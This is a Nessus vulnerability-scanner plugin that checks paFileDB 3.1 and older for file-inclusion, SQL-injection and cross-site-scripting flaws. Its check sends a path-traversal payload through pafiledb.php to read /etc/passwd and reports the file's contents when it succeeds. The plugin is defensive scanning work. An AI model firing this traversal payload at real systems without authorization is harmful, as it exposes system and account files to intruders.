#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(11806);
  script_version ("$Revision: 1.31 $");

  script_cve_id(
    "CVE-2004-1219",
    "CVE-2004-1551",
    "CVE-2004-1975",
    "CVE-2005-0326",
    "CVE-2005-0327",
    "CVE-2005-0723",
    "CVE-2005-0724",
    "CVE-2005-0781",
    "CVE-2005-0782"
  );
  script_bugtraq_id(
    7183,
    8271,
    10229,
    11817,
    11818,
    12758,
    12788,
    12952
  );
  script_osvdb_id(
    5695,
    12263,
    12264,
    14684,
    14839,
    14840,
    14841,
    14842,
    14967,
    14968,
    14969,
    14970,
    14971,
    14972,
    14973,
    14974,
    14975,
    14976,
    14977,
    15033,
    15293,
    58502
  );
 
  script_name(english:"paFileDB <= 3.1 Multiple Vulnerabilities (1)");
  script_summary(english:"Checks for multiple vulnerabilities in paFileDB 3.1 and Older");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of paFileDB that is prone to a
wide variety of vulnerabilities, including arbitrary file uploads,
local file inclusion, SQL injection, and cross-site scripting issues." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Jan/377" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version from PHP Arena.  Note that fix released
31-Mar-2005 does not change the version number." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/07/24");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/09/25");
 script_cvs_date("$Date: 2016/11/17 15:28:26 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");

  script_dependencies("pafiledb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/pafiledb");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/pafiledb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit one of the flaws to read a file.
  file = "../../../../../../../../../../etc/passwd%00";
  r = http_send_recv3(item:string(dir, "/pafiledb.php?","login=do&","action=", file), port:port, method:"GET");
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access might still work or...
    egrep(pattern:"main\(.+/etc/passwd\\0/login\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(.+/etc/passwd\).*: failed to open stream: No such file
or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(.+/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_hole(port:port, extra:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
